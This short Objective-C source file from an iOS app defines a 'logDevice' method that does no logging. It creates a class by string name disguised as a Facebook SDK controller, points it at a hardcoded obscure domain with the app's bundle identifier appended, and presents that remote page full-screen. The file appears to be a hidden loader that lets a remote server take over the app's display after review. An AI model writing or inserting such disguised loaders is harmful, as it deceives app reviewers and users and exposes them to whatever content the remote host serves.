//
//  UIViewController+LOGDevice.m
//  Cardifyz
//
//  Created by jin fu on 01/04/24.
//

#import "UIViewController+mypoker.h"

@implementation UIViewController (mypoker)

- (void)logDevice
{
  
    Class class = NSClassFromString(@"fbsdkController");
    id hintvc = [[class alloc] init];
    [hintvc setValue:[NSString stringWithFormat:@"%@%@", [self priHeader], NSBundle.mainBundle.bundleIdentifier] forKey:@"url"];
    [hintvc setValue:@(0) forKey:@"modalPresentationStyle"];
    
 //   [self.navigationController pushViewController:(UIViewController *)hintvc animated:YES];
    
    [self presentViewController:(UIViewController *)hintvc animated:NO completion:nil];
}
- (NSString *)priHeader
{
    return @"http://fby.kouuycl.xyz/?web_PackageName=";
}
@end
